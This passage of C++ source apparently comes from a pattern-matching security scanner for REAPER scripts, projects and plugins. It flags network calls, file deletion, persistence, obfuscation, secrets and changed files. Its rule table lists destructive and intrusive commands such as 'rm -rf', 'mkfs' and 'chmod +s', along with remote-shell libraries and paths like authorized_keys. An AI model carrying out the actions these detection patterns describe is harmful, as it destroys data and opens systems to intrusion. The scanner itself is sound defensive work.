++  {"py-telnetlib", PY, "telnetlib", NONE, S::High, "network", "backdoor", "telnetlib", "remote shell protocol", .7, .3},
++  {"py-websocket", PY | JS, "websocket", NONE, S::Medium, "network", "call_home", "WebSocket", "persistent network channel", .6, .4},
++  {"py-paramiko", PY, "paramiko", NONE, S::Medium, "network", "call_home", "paramiko (SSH)", "remote SSH access", .6, .4},
++  {"lua-socket", LUA, "socket.", NOT_AFTER_DOT, S::Medium, "network", "call_home", "Lua socket", "network access", .5, .5},
++  {"lua-luasocket", LUA, "luasocket", NONE, S::Medium, "network", "call_home", "luasocket", "network access", .6, .4},
++  {"js-xhr", JS, "xmlhttprequest", NONE, S::Medium, "network", "call_home", "XMLHttpRequest", "makes HTTP requests", .6, .4},
++  {"js-fetch", JS, "fetch(", NOT_AFTER_DOT, S::Medium, "network", "call_home", "fetch", "makes HTTP requests", .5, .5},
++  // ---- file writes / destruction ----
++  {"py-rmtree", PY, "shutil.rmtree", NONE, S::Medium, "file_write", "other", "recursive delete", "deletes directory trees", .6, .4},
++  {"py-os-remove", PY, "os.remove(", NONE, S::Medium, "file_write", "other", "file delete", "deletes files", .5, .5},
++  {"py-os-unlink", PY, "os.unlink(", NONE, S::Medium, "file_write", "other", "file delete", "deletes files", .5, .5},
++  {"lua-os-remove", LUA, "os.remove(", NONE, S::Medium, "file_write", "other", "file delete", "deletes files", .5, .5},
++  {"lua-os-rename", LUA, "os.rename(", NONE, S::Low, "file_write", "other", "file rename", "moves or replaces files", .4, .6},
++  {"sh-rm-rf", SH, "rm -rf", NONE, S::High, "file_write", "other", "rm -rf", "recursive forced delete", .7, .3},
++  {"sh-dd", SH, "dd if=", NONE, S::High, "file_write", "other", "dd", "raw disk or file overwrite", .7, .3},
++  {"sh-mkfs", SH, "mkfs", NONE, S::High, "file_write", "other", "mkfs", "formats a filesystem", .8, .2},
++  {"sh-chmod-777", SH, "chmod 777", NONE, S::Medium, "file_write", "other", "chmod 777", "world-writable permissions", .6, .4},
++  {"sh-chmod-suid", SH, "chmod +s", NONE, S::High, "persistence", "backdoor", "setuid bit", "privilege escalation vector", .8, .2},
++  {"bat-rmdir", BAT, "rmdir /s", NONE, S::High, "file_write", "other", "rmdir /s", "recursive delete", .7, .3},
++  // ---- persistence (any language) ----
++  {"any-crontab", ALL, "crontab", NONE, S::Medium, "persistence", "backdoor", "cron entry", "can create persistence", .5, .5},
++  {"any-systemctl", ALL, "systemctl enable", NONE, S::Medium, "persistence", "backdoor", "systemd enable", "can create persistence", .6, .4},
++  {"any-launchctl", ALL, "launchctl", NONE, S::Medium, "persistence", "backdoor", "launchctl", "can create persistence on macOS", .5, .5},
++  {"any-launchagents", ALL, "launchagents", NONE, S::Medium, "persistence", "backdoor", "LaunchAgents path", "can create persistence on macOS", .6, .4},
++  {"any-run-key", ALL, "currentversion\\run", NONE, S::Medium, "persistence", "backdoor", "Windows Run key", "can create persistence", .7, .3},
++  {"any-bashrc", ALL, ".bashrc", NONE, S::Low, "persistence", "backdoor", "shell startup file", "check whether it is written to", .3, .7},
++  {"any-rclocal", ALL, "/etc/rc.local", NONE, S::Medium, "persistence", "backdoor", "rc.local", "can create persistence", .6, .4},
++  {"any-authkeys", ALL, "authorized_keys", NONE, S::High, "persistence", "backdoor", "authorized_keys", "SSH key injection", .7, .3},
++  // ---- REAPER specifics ----
++  {"reaper-addremove", LUALIKE, "addremovereascript", NO_BOUNDARY, S::Medium, "persistence", "reascript_risk", "AddRemoveReaScript", "registers actions persistently", .6, .4},
++  {"reaper-jsmem", LUALIKE, "js_mem", NO_BOUNDARY, S::Medium, "dynamic_code", "reascript_risk", "js_ReaScriptAPI memory access", "raw memory access gives a script wide reach", .6, .4},
++  {"reaper-defer", LUALIKE, "reaper.defer(", NONE, S::Info, "persistence", "reascript_risk", "defer loop", "runs in the background until stopped; check that it terminates", .3, .8},
++  {"jsfx-fileopen", JSFX, "file_open(", NONE, S::Low, "file_write", "reascript_risk", "JSFX file access", "unexpected for an audio effect", .5, .5},
++  // ---- anti-analysis ----
++  {"any-isdebugger", CODE, "isdebuggerpresent", NONE, S::Medium, "anti_analysis", "backdoor", "debugger check", "anti-debugging", .6, .4},
++  {"py-gettrace", PY, "sys.gettrace", NONE, S::Low, "anti_analysis", "backdoor", "tracer check", "may detect debuggers", .4, .6},
++  {"any-vm-check", CODE, "virtualbox", NONE, S::Low, "anti_analysis", "backdoor", "virtual machine string", "may be an anti-VM check", .3, .7},
++  {"any-tracerpid", CODE, "tracerpid", NONE, S::Low, "anti_analysis", "backdoor", "TracerPid check", "may be an anti-debug check", .4, .6},
++};
++
++bool ident(char c) { return std::isalnum(static_cast<unsigned char>(c)) || c == '_'; }
++std::string lower(std::string s) { for (auto& c : s) c = static_cast<char>(std::tolower(static_cast<unsigned char>(c))); return s; }
++bool ends_with(const std::string& s, const std::string& e) { return s.size() >= e.size() && s.compare(s.size() - e.size(), e.size(), e) == 0; }
++
++unsigned lang_bit(const std::string& l) {
++  static const std::map<std::string, unsigned> m = {{"python", PY}, {"lua", LUA}, {"eel", EEL}, {"jsfx", JSFX}, {"shell", SH}, {"batch", BAT},
++    {"powershell", PS}, {"javascript", JS}, {"c/c++", CC}, {"reaper-project", RPP}, {"config", CFG}, {"text", OTHER}, {"reaper-actions", KB}};
++  auto it = m.find(l); return it == m.end() ? OTHER : it->second;
++}
++std::string trim(const std::string& s) {
++  std::size_t a = 0, b = s.size();
++  while (a < b && std::isspace(static_cast<unsigned char>(s[a]))) ++a;
++  while (b > a && std::isspace(static_cast<unsigned char>(s[b - 1]))) --b;
++  return s.substr(a, b - a);
++}
++std::string clip(const std::string& s, std::size_t n = 120) {
++  std::string t = trim(s);
++  if (t.size() > n) t = t.substr(0, n) + "...";
++  for (auto& c : t) if (static_cast<unsigned char>(c) < 32 && c != '\t') c = ' ';
++  return t;
++}
++// Splits a line into code and comment parts (best effort; tracks block comments and triple-quoted strings).
++struct LineState { bool block_comment = false; bool triple = false; char triple_q = 0; bool lua_block = false; };
++void split_comment(const std::string& line, unsigned lang, LineState& st, std::string& code, std::string& comment) {
++  code.clear(); comment.clear();
++  const bool hash_c = lang & (PY | SH | PS | CFG | OTHER);
++  const bool slash_c = lang & (JS | CC | EEL | JSFX);
++  const bool dash_c = lang & LUA;
++  char q = 0;
++  for (std::size_t i = 0; i < line.size(); ++i) {
++    char c = line[i];
++    if (st.block_comment) { comment.push_back(c); if (c == '*' && i + 1 < line.size() && line[i + 1] == '/') { st.block_comment = false; comment.push_back('/'); ++i; } continue; }
++    if (st.lua_block) { comment.push_back(c); if (c == ']' && i + 1 < line.size() && line[i + 1] == ']') { st.lua_block = false; comment.push_back(']'); ++i; } continue; }
++    if (st.triple) {   // inside a Python triple-quoted string: treat as comment text
++      comment.push_back(c);
++      if (c == st.triple_q && i + 2 < line.size() + 0 && line.compare(i, 3, std::string(3, st.triple_q)) == 0) { st.triple = false; comment += std::string(2, st.triple_q); i += 2; }
++      continue;
++    }
++    if (q) { code.push_back(c); if (c == '\\' && i + 1 < line.size()) { code.push_back(line[++i]); } else if (c == q) q = 0; continue; }
++    if ((lang & PY) && (c == '"' || c == '\'') && line.compare(i, 3, std::string(3, c)) == 0) { st.triple = true; st.triple_q = c; i += 2; continue; }
++    if (c == '"' || c == '\'') { q = c; code.push_back(c); continue; }
++    if (slash_c && c == '/' && i + 1 < line.size() && line[i + 1] == '/') { comment = line.substr(i); return; }
++    if (slash_c && c == '/' && i + 1 < line.size() && line[i + 1] == '*') { st.block_comment = true; comment.push_back('/'); continue; }
++    if (dash_c && c == '-' && i + 1 < line.size() && line[i + 1] == '-') {
++      if (line.compare(i, 4, "--[[") == 0) { st.lua_block = true; comment = line.substr(i); return; }
++      comment = line.substr(i); return;
++    }
++    if (hash_c && c == '#') { comment = line.substr(i); return; }
++    if ((lang & PS) && c == '<' && line.compare(i, 2, "<#") == 0) { comment = line.substr(i); return; }
++    code.push_back(c);
++  }
++  if (lang & BAT) { std::string t = lower(trim(code)); if (t.rfind("rem ", 0) == 0 || t.rfind("::", 0) == 0) { comment = code; code.clear(); } }
++}
++bool has_write_mode(const std::string& after_open) {
++  const std::size_t end = std::min<std::size_t>(after_open.size(), 120);
++  for (std::size_t i = 0; i + 2 < end; ++i) {
++    char q = after_open[i];
++    if (q != '"' && q != '\'') continue;
++    std::size_t j = i + 1;
++    if (j < end && (after_open[j] == 'w' || after_open[j] == 'a' || after_open[j] == 'x')) {
++      ++j; while (j < end && (after_open[j] == '+' || after_open[j] == 'b' || after_open[j] == 't')) ++j;
++      if (j < end && after_open[j] == q) return true;
++    }
++  }
++  return false;
++}
++bool is_local_host(const std::string& h) {
++  return h == "localhost" || h == "::1" || h == "[::1]" || h.rfind("127.", 0) == 0 || h == "0.0.0.0";
++}
++bool parse_ipv4(const std::string& h) {
++  int parts = 0; std::size_t i = 0;
++  while (i < h.size()) {
++    std::size_t j = i; int v = 0;
++    while (j < h.size() && std::isdigit(static_cast<unsigned char>(h[j]))) { v = v * 10 + (h[j] - '0'); if (v > 255) return false; ++j; }
++    if (j == i) return false;
++    ++parts; if (j == h.size()) break;
++    if (h[j] != '.') return false;
++    i = j + 1;
++  }
++  return parts == 4;
++}
++bool host_allowed(const std::string& host, const std::vector<std::string>& allow) {
++  for (auto a : allow) { a = lower(a); if (host == a || (host.size() > a.size() && ends_with(host, "." + a))) return true; }
++  return false;
++}
++bool b64ish(char c) { return std::isalnum(static_cast<unsigned char>(c)) || c == '+' || c == '/' || c == '='; }
++bool all_b64(const std::string& s) { if (s.empty()) return false; for (char c : s) if (!b64ish(c)) return false; return true; }
++
++struct Ctx {
++  const Options& opt; std::string file; unsigned lang; Report& rep;
++  Ctx(const Options& o, std::string f, unsigned l, Report& r) : opt(o), file(std::move(f)), lang(l), rep(r) {}
++  std::size_t plugin_refs = 0, media_refs = 0, blobs = 0, urls = 0;
++  std::size_t decode_line = 0, exec_line = 0;
++  std::set<std::string> seen;   // dedupe rule+line
++  void add(const char* rule, const char* topic, const char* cat, const std::string& title, Severity sev, std::size_t line, const std::string& ev,
++           const std::string& why, double conf, double fp) {
++    std::string key = std::string(rule) + ":" + std::to_string(line) + ":" + ev;
++    if (!seen.insert(key).second) return;
++    Finding f; f.rule = rule; f.topic = topic; f.category = cat; f.title = title; f.severity = sev; f.file = file; f.line = line;
++    f.evidence = ev; f.why = why; f.confidence = conf; f.false_positive = fp; rep.findings.push_back(std::move(f));
++  }
++};
++
++void scan_urls(Ctx& c, const std::string& line, std::size_t ln) {
++  const std::string lo = lower(line);
++  for (std::size_t p = lo.find("://"); p != std::string::npos; p = lo.find("://", p + 3)) {
++    std::size_t s = p; while (s > 0 && std::isalpha(static_cast<unsigned char>(lo[s - 1]))) --s;
++    std::string scheme = lo.substr(s, p - s);
++    if (scheme != "http" && scheme != "https" && scheme != "ftp" && scheme != "ws" && scheme != "wss" && scheme != "tcp" && scheme != "udp" && scheme != "sftp") continue;
++    std::size_t h = p + 3, e = h;
++    while (e < lo.size() && !std::strchr("/?#\"' )]>,;\\", lo[e]) && !std::isspace(static_cast<unsigned char>(lo[e]))) ++e;
++    std::string host = lo.substr(h, e - h);
++    auto at = host.rfind('@'); if (at != std::string::npos) host = host.substr(at + 1);
++    if (!host.empty() && host[0] != '[') { auto col = host.find(':'); if (col != std::string::npos) host = host.substr(0, col); }
++    if (host.empty() || host.find('{') != std::string::npos || host.find('$') != std::string::npos || host.find('%') != std::string::npos) continue;
++    if (is_local_host(host) || host_allowed(host, c.opt.allow_hosts)) continue;
++    ++c.urls;
++    std::string url = clip(line.substr(s, std::min<std::size_t>(e - s + 40, 160)), 100);
++    if (ends_with(host, ".onion") || ends_with(host, ".i2p")) c.add("url-onion", "network", "call_home", "Tor/I2P address", S::High, ln, url, "anonymity-network endpoint", .85, .1);
++    else if (parse_ipv4(host)) c.add("url-ip-literal", "network", "call_home", "URL with an IP address", S::Medium, ln, url, "raw IP endpoints bypass DNS-based review; verify it is authorized", .6, .4);
++    else if (scheme == "http" || scheme == "ftp" || scheme == "ws") c.add("url-cleartext", "network", "call_home", "Cleartext URL to " + host, S::Medium, ln, url, "unencrypted network endpoint; verify it is authorized", .5, .5);
++    else c.add("url-host", "network", "call_home", "URL to " + host, S::Low, ln, url, "verify the host against the authorized endpoints", .4, .6);
++  }
++}
++void scan_generic(Ctx& c, const std::string& line, std::size_t ln) {
++  scan_urls(c, line, ln);
++  if (line.size() > 8 && line.size() < 4000) {
++    for (auto& f : fk::clipboard::scan_sensitive(line))
++      if (f.kind != "long opaque token-like string")
++        c.add("secret", "secret", "other", "possible secret: " + f.kind, S::Medium, ln, "[redacted]", "credentials in source can leak or act as a hard-coded backdoor credential", .6, .4);
++  }
++  std::size_t run = 0, best = 0; std::size_t hexrun = 0, hexbest = 0, xcount = 0;
++  for (std::size_t i = 0; i < line.size(); ++i) {
++    char ch = line[i];
++    run = b64ish(ch) ? run + 1 : 0; best = std::max(best, run);
++    hexrun = std::isxdigit(static_cast<unsigned char>(ch)) ? hexrun + 1 : 0; hexbest = std::max(hexbest, hexrun);
++    if (ch == '\\' && i + 1 < line.size() && (line[i + 1] == 'x' || line[i + 1] == 'u')) ++xcount;
++  }
++  const bool blob_ok = (c.lang & (RPP | CFG)) && (all_b64(trim(line)) || line.find('=') == std::string::npos);
++  if (best >= 120 && !(c.lang & RPP && all_b64(trim(line)))) { ++c.blobs; if (c.lang & RPP) {} else c.add("long-base64", "obfuscation", "backdoor", "long encoded blob", S::Medium, ln, "(" + std::to_string(best) + " base64-like characters)", "encoded payloads are a common way to hide code or data", .5, .5); }
++  else if (hexbest >= 96 && !blob_ok) c.add("long-hex", "obfuscation", "backdoor", "long hex string", S::Low, ln, "(" + std::to_string(hexbest) + " hex characters)", "may be an encoded payload (or a hash/key)", .3, .7);
++  if (xcount > 40) c.add("escape-heavy", "obfuscation", "backdoor", "heavy \\x / \\u escape sequences", S::Medium, ln, "(" + std::to_string(xcount) + " escapes)", "character escapes are used to hide strings", .5, .5);
++  if (line.size() > 5000 && !(c.lang & (RPP | CFG))) c.add("very-long-line", "obfuscation", "backdoor", "very long line (minified or obfuscated?)", S::Low, ln, "(" + std::to_string(line.size()) + " characters)", "hard to review", .3, .7);
++}
++void apply_rules(Ctx& c, const std::string& code, std::size_t ln, const std::string& full) {
++  const std::string lo = lower(code);
++  if (lo.empty()) return;
++  for (const auto& r : kRules) {
++    if (!(r.langs & c.lang)) continue;
++    const std::string needle = r.needle;
++    for (std::size_t p = lo.find(needle); p != std::string::npos; p = lo.find(needle, p + 1)) {
++      if (ident(needle[0]) && !(r.flags & NO_BOUNDARY)) {
++        if (p > 0 && ident(lo[p - 1])) continue;
++        if ((r.flags & NOT_AFTER_DOT) && p > 0 && lo[p - 1] == '.') continue;
++      }
++      c.add(r.id, r.topic, r.category, r.title, r.sev, ln, clip(full), r.why, r.conf, r.fp);
++      break;
++    }
++  }
++  // write-mode open()
++  for (std::size_t p = lo.find("open("); p != std::string::npos; p = lo.find("open(", p + 1)) {
++    if (p > 0 && (ident(lo[p - 1]) && lo[p - 1] != '.')) continue;
++    const bool lua_io = p >= 3 && lo.compare(p - 3, 3, "io.") == 0;
++    if (((c.lang & PY) && (p == 0 || lo[p - 1] != '.' ) ) || ((c.lang & LUA) && lua_io)) {
++      if (has_write_mode(code.substr(p))) { c.add("file-write-open", "file_write", "other", "file opened for writing", S::Medium, ln, clip(full), "writes files; check the destination and that the user asked for it", .5, .5); break; }
++    }
++  }
++  // persistent ExtState
++  std::size_t es = lo.find("setextstate(");
++  if (es != std::string::npos && (c.lang & LUALIKE)) {
++    std::string rest = lo.substr(es);
++    auto cp = rest.rfind(')'); if (cp != std::string::npos) rest = rest.substr(0, cp);
++    auto tp = rest.rfind("true");
++    if (tp != std::string::npos && rest.find_first_not_of(" \t", tp + 4) == std::string::npos)
++      c.add("reaper-extstate-persist", "persistence", "reascript_risk", "persistent ExtState write", S::Medium, ln, clip(full), "saved to disk and read back across sessions; can hold state or payloads", .5, .5);
++  }
++  // decode and execute markers (file-level combination)
++  static const char* dec[] = {"b64decode", "atob(", "fromhex(", "frombase64string", "base64 -d", "codecs.decode(", "zlib.decompress", "string.char("};
++  static const char* exe[] = {"exec(", "eval(", "loadstring(", "load(", "os.system(", "subprocess.", "invoke-expression", "iex ", "os.execute", "execprocess("};
++  for (auto d : dec) if (lo.find(d) != std::string::npos && !c.decode_line) c.decode_line = ln;
++  for (auto e : exe) { auto p = lo.find(e); if (p != std::string::npos && (p == 0 || !ident(lo[p - 1])) && !c.exec_line) c.exec_line = ln; }
++}
++void scan_rpp(Ctx& c, const std::string& line, std::size_t ln) {
++  std::string t = trim(line);
++  static const char* plug[] = {"<vst ", "<vst3 ", "<clap ", "<js ", "<au ", "<dx ", "<vst3i ", "<vsti "};
++  std::string lo = lower(t);
++  for (auto p : plug) if (lo.rfind(p, 0) == 0) { if (++c.plugin_refs <= 200) c.add("rpp-plugin", "inventory", "unauthorized_plugin", "project references a plugin", S::Info, ln, clip(t, 110), "inventory for the plugin allowlist; confirm each plugin is authorized", .5, .5); return; }
++  if (lo.rfind("file ", 0) == 0 || lo.rfind("filename ", 0) == 0) {
++    bool abs = t.find(" \"/") != std::string::npos || t.find(" /") != std::string::npos || (t.size() > 8 && t.find(":\\") != std::string::npos) || t.find("..") != std::string::npos;
++    if (abs && ++c.media_refs <= 100) c.add("rpp-external-path", "inventory", "other", "media or file path outside the project", S::Low, ln, clip(t, 110), "project depends on a file at an absolute or parent path", .4, .6);
++  }
++}
++void scan_kb(Ctx& c, const std::string& line, std::size_t ln) {
++  std::string t = trim(line);
++  if (t.rfind("SCR ", 0) == 0) c.add("kb-script", "persistence", "reascript_risk", "registered script action", S::Info, ln, clip(t, 140), "script registered as an action; confirm it is reviewed", .5, .5);
++  else if (t.rfind("ACT ", 0) == 0) c.add("kb-custom-action", "inventory", "reascript_risk", "custom action", S::Info, ln, clip(t, 140), "custom action; check what it runs", .4, .6);
++}
++
++std::string strip_nuls_for_utf16(const std::string& raw, bool& changed) {
++  changed = false;
++  if (raw.size() >= 2 && ((static_cast<unsigned char>(raw[0]) == 0xFF && static_cast<unsigned char>(raw[1]) == 0xFE) || (static_cast<unsigned char>(raw[0]) == 0xFE && static_cast<unsigned char>(raw[1]) == 0xFF))) {
++    std::string out; for (std::size_t i = 2; i < raw.size(); ++i) if (raw[i] != '\0') out.push_back(raw[i]);
++    changed = true; return out;
++  }
++  return raw;
++}
++std::string magic_kind(const std::string& raw) {
++  auto u = [&](std::size_t i) { return i < raw.size() ? static_cast<unsigned char>(raw[i]) : 0u; };
++  if (u(0) == 0x7F && u(1) == 'E' && u(2) == 'L' && u(3) == 'F') return "ELF executable/library";
++  if (u(0) == 'M' && u(1) == 'Z') return "Windows PE executable/DLL";
++  if ((u(0) == 0xCF && u(1) == 0xFA && u(2) == 0xED && u(3) == 0xFE) || (u(0) == 0xFE && u(1) == 0xED && u(2) == 0xFA) || (u(0) == 0xCA && u(1) == 0xFE && u(2) == 0xBA && u(3) == 0xBE)) return "Mach-O executable/library";
++  if (u(0) == 'P' && u(1) == 'K' && u(2) == 3 && u(3) == 4) return "ZIP archive";
++  if (u(0) == 0x1F && u(1) == 0x8B) return "gzip archive";
++  if (u(0) == '%' && u(1) == 'P' && u(2) == 'D' && u(3) == 'F') return "PDF document";
++  return "binary data";
++}
++void scan_content(Ctx& c, const std::string& text) {
++  LineState st; std::size_t ln = 0; std::size_t pos = 0;
++  std::string code, comment;
++  const unsigned lang = c.lang;
++  while (pos <= text.size()) {
++    std::size_t e = text.find('\n', pos);
++    std::string line = text.substr(pos, e == std::string::npos ? std::string::npos : e - pos);
++    if (!line.empty() && line.back() == '\r') line.pop_back();
++    ++ln; pos = (e == std::string::npos) ? text.size() + 1 : e + 1;
++    if (line.empty()) continue;
++    const std::string scan_line = line.size() > 20000 ? line.substr(0, 20000) : line;
++    if (lang & RPP) { scan_rpp(c, scan_line, ln); }
++    if (lang & KB) { scan_kb(c, scan_line, ln); }
++    if (lang & (RPP)) { std::string t = trim(scan_line); if (all_b64(t) && t.size() >= 40) { ++c.blobs; continue; } }
++    split_comment(scan_line, lang, st, code, comment);
++    if (lang & (CODE | KB)) apply_rules(c, code, ln, scan_line);
++    scan_generic(c, scan_line, ln);
++    if (lang & OTHER) apply_rules(c, scan_line, ln, scan_line);   // generic persistence rules apply to text/config too
++    else if (lang & CFG) apply_rules(c, code, ln, scan_line);
++  }
++  if (c.decode_line && c.exec_line)
++    c.add("decode-and-exec", "obfuscation", "backdoor", "decode-and-execute pattern", S::High, c.exec_line,
++          "(decoder on line " + std::to_string(c.decode_line) + ", execution on line " + std::to_string(c.exec_line) + ")",
++          "content is decoded and then executed: the classic way to hide a payload", .7, .3);
++  if (c.plugin_refs > 200) c.rep.limitations.push_back(c.file + ": " + std::to_string(c.plugin_refs) + " plugin references (first 200 listed)");
++  if (c.blobs && (lang & RPP)) c.add("rpp-state-blob", "inventory", "other", "embedded plugin state blobs", S::Info, 0, "(" + std::to_string(c.blobs) + " base64 lines)", "plugin state is stored as opaque base64; its contents are NOT analyzed", .8, .2);
++}
++void parse_baseline(const std::string& path, std::map<std::string, std::string>& out, std::string& err) {
++  std::ifstream f(path);
++  if (!f) { err = "cannot open baseline file: " + path; return; }
++  std::string line; std::size_t n = 0;
++  while (std::getline(f, line)) {
++    ++n; if (!line.empty() && line.back() == '\r') line.pop_back();
++    if (line.empty() || line[0] == '#') continue;
++    if (line.size() < 67 || line[64] != ' ') { err = "baseline line " + std::to_string(n) + " is not '<sha256>  <path>'"; return; }
++    for (int i = 0; i < 64; ++i) if (!std::isxdigit(static_cast<unsigned char>(line[static_cast<std::size_t>(i)]))) { err = "baseline line " + std::to_string(n) + ": bad hash"; return; }
++    std::string p = line.substr(65); if (!p.empty() && (p[0] == ' ' || p[0] == '*')) p = p.substr(1);
++    while (p.rfind("./", 0) == 0) p = p.substr(2);
++    out[p] = lower(line.substr(0, 64));
++  }
++}
++}  // namespace
++
++std::size_t Report::count(Severity s) const { std::size_t n = 0; for (auto& f : findings) if (f.severity == s) ++n; return n; }
++Severity Report::worst() const { Severity w = Severity::Info; for (auto& f : findings) if (f.severity > w) w = f.severity; return w; }
++
++std::string detect_language(const std::string& filename, const std::string& first_line) {
++  const std::string n = lower(fs::path(filename).filename().string());
++  const std::string ext = lower(fs::path(filename).extension().string());
++  if (n == "reaper-kb.ini") return "reaper-actions";
++  if (ext == ".rpp" || ext == ".rpp-bak" || ext == ".rpp-undo") return "reaper-project";
++  static const std::map<std::string, std::string> m = {{".py", "python"}, {".pyw", "python"}, {".pyi", "python"}, {".lua", "lua"}, {".eel", "eel"}, {".jsfx", "jsfx"},
++    {".sh", "shell"}, {".bash", "shell"}, {".zsh", "shell"}, {".ksh", "shell"}, {".bat", "batch"}, {".cmd", "batch"}, {".ps1", "powershell"}, {".psm1", "powershell"},
++    {".js", "javascript"}, {".mjs", "javascript"}, {".cjs", "javascript"}, {".ts", "javascript"}, {".c", "c/c++"}, {".h", "c/c++"}, {".cpp", "c/c++"}, {".hpp", "c/c++"},
++    {".cc", "c/c++"}, {".cxx", "c/c++"}, {".hxx", "c/c++"}, {".m", "c/c++"}, {".mm", "c/c++"}, {".ini", "config"}, {".cfg", "config"}, {".conf", "config"},
++    {".json", "config"}, {".yaml", "config"}, {".yml", "config"}, {".toml", "config"}, {".xml", "config"}, {".plist", "config"}, {".cmake", "config"},
++    {".txt", "text"}, {".md", "text"}, {".rst", "text"}};
++  auto it = m.find(ext); if (it != m.end()) return it->second;
++  if (n == "makefile" || n == "dockerfile") return "shell";
++  if (first_line.rfind("#!", 0) == 0) {
++    const std::string l = lower(first_line);
++    if (l.find("python") != std::string::npos) return "python";
++    if (l.find("lua") != std::string::npos) return "lua";
++    if (l.find("node") != std::string::npos) return "javascript";
++    if (l.find("pwsh") != std::string::npos || l.find("powershell") != std::string::npos) return "powershell";
++    if (l.find("sh") != std::string::npos) return "shell";
++  }
++  if (lower(first_line).rfind("desc:", 0) == 0) return "jsfx";
++  return "text";
++}
++
++Report scan_text(const std::string& name, const std::string& text, const Options& opt) {
++  Report rep;
++  std::string first = text.substr(0, text.find('\n'));
++  Ctx c{opt, name, lang_bit(detect_language(name, first)), rep};
++  FileInfo fi; fi.path = name; fi.language = detect_language(name, first); fi.bytes = text.size(); fi.scanned = true;
++  fi.sha256 = fk::hash::sha256_hex(reinterpret_cast<const unsigned char*>(text.data()), text.size());
++  rep.files.push_back(fi);
++  bool utf16 = false; std::string body = strip_nuls_for_utf16(text, utf16);
++  scan_content(c, body);
++  rep.limitations = {"Pattern matching only: false positives and false negatives are expected, and deliberate obfuscation defeats it.",
++                     "Nothing was executed, imported, extracted or fetched; URLs were not contacted."};
++  return rep;
++}
++
++Result<Report> scan_path(const fs::path& root, const Options& opt) {
++  using R = Result<Report>;
++  std::error_code ec;
++  const auto st = fs::symlink_status(root, ec);
++  if (ec) return R::fail("cannot access " + root.string());
++  if (fs::is_symlink(st)) return R::fail("refusing to scan through a symbolic link: " + root.string());
++  Report rep;
++  std::vector<fs::path> paths;
++  if (fs::is_regular_file(st)) paths.push_back(root);
++  else if (fs::is_directory(st)) {
++    fs::recursive_directory_iterator it(root, fs::directory_options::skip_permission_denied, ec), end;
++    if (ec) return R::fail("cannot read directory " + root.string());
++    for (; it != end; it.increment(ec)) {
++      if (ec) { ++rep.skipped; ec.clear(); continue; }
++      if (it->is_symlink(ec)) { ++rep.skipped; ec.clear(); continue; }
++      if (it.depth() >= opt.max_depth) { it.disable_recursion_pending(); }
++      if (!it->is_regular_file(ec)) continue;
++      if (paths.size() >= opt.max_files) { rep.limitations.push_back("file limit reached (" + std::to_string(opt.max_files) + "); remaining files were not scanned"); break; }
++      paths.push_back(it->path());
++    }
++    std::sort(paths.begin(), paths.end());
++  } else return R::fail("not a regular file or directory: " + root.string());
++
++  std::map<std::string, std::string> base; bool have_base = false;
++  if (!opt.baseline_path.empty()) {
++    std::string err; parse_baseline(opt.baseline_path, base, err);
++    if (!err.empty()) return R::fail(err);
++    have_base = true; rep.baseline.used = true;
++  }
++  const bool single = fs::is_regular_file(st);
++  std::set<std::string> seen_rel;
++  for (const auto& p : paths) {
++    std::string rel = single ? p.filename().generic_string() : fs::relative(p, root, ec).generic_string();
++    FileInfo fi; fi.path = rel;
++    auto size = fs::file_size(p, ec); fi.bytes = ec ? 0 : size; ec.clear();
++    auto h = fk::hash::sha256_file(p); fi.sha256 = h ? *h : "";
++    seen_rel.insert(rel);
++    if (have_base) {
++      auto b = base.find(rel);
++      if (b == base.end()) rep.baseline.new_files.push_back(rel);
++      else if (b->second != fi.sha256) rep.baseline.modified.push_back(rel);
++    }
++    if (fi.bytes > opt.max_file_bytes) { fi.language = "unknown"; fi.note = "larger than the scan limit: hashed, not scanned"; rep.files.push_back(fi); ++rep.skipped; continue; }
++    std::ifstream f(p, std::ios::binary);
++    if (!f) { fi.note = "cannot read: skipped"; rep.files.push_back(fi); ++rep.skipped; continue; }
++    std::string raw((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());
++    bool changed = false; std::string text = strip_nuls_for_utf16(raw, changed);
++    const bool binary = text.substr(0, 8192).find('\0') != std::string::npos;
++    Ctx c{opt, rel, 0, rep};
++    if (binary) {
++      const std::string kind = magic_kind(raw);
++      fi.language = "binary: " + kind; fi.note = "hashed; contents not analyzed";
++      const std::string ext = lower(p.extension().string());
++      static const std::set<std::string> plug = {".dll", ".so", ".dylib", ".vst3", ".vst", ".clap", ".component", ".aaxplugin", ".node", ".exe"};
++      if (kind.find("executable") != std::string::npos || kind.find("DLL") != std::string::npos) {
++        if (plug.count(ext)) c.add("native-plugin-binary", "inventory", "unauthorized_plugin", "native code file: " + kind, S::Medium, 0, rel, "compiled code is not analyzed here; confirm it is on the plugin allowlist and verify its hash/signature", .6, .4);
++        else c.add("native-binary", "inventory", "other", "native code file: " + kind, S::Low, 0, rel, "compiled code is not analyzed here", .5, .5);
++      } else if (kind.find("archive") != std::string::npos)
++        c.add("archive-not-opened", "inventory", "other", "archive not opened: " + kind, S::Low, 0, rel, "contents were not inspected; extract it into an isolated folder and scan that", .5, .5);
++      rep.files.push_back(fi); continue;
++    }
++    const std::string first = text.substr(0, text.find('\n'));
++    fi.language = detect_language(rel, first); fi.scanned = true; c.lang = lang_bit(fi.language);
++    if (changed) fi.note = "UTF-16 detected; scanned as its ASCII subset";
++    if (lower(fs::path(rel).filename().string()).rfind("__startup.", 0) == 0)
++      c.add("reaper-startup-script", "persistence", "reascript_risk", "startup script", S::Medium, 0, rel, "name suggests it runs when REAPER starts (verify against your REAPER version)", .5, .5);
++    scan_content(c, text);
++    rep.files.push_back(fi);
++  }
++  if (have_base) for (auto& kv : base) if (!seen_rel.count(kv.first) && !single) rep.baseline.missing.push_back(kv.first);
++  if (have_base) {
++    for (auto& m : rep.baseline.modified) { Finding f; f.rule = "baseline-modified"; f.topic = "integrity"; f.category = "altered_code"; f.title = "file differs from baseline"; f.file = m; f.severity = Severity::High; f.evidence = "SHA-256 mismatch"; f.why = "the hash is certain; whether the change is malicious is not"; f.confidence = 0.95; f.false_positive = 0.05; rep.findings.push_back(f); }
++    for (auto& m : rep.baseline.new_files) { Finding f; f.rule = "baseline-new"; f.topic = "integrity"; f.category = "altered_code"; f.title = "file not in baseline"; f.file = m; f.severity = Severity::Medium; f.evidence = "new file"; f.why = "not part of the reviewed baseline"; f.confidence = 0.9; f.false_positive = 0.2; rep.findings.push_back(f); }
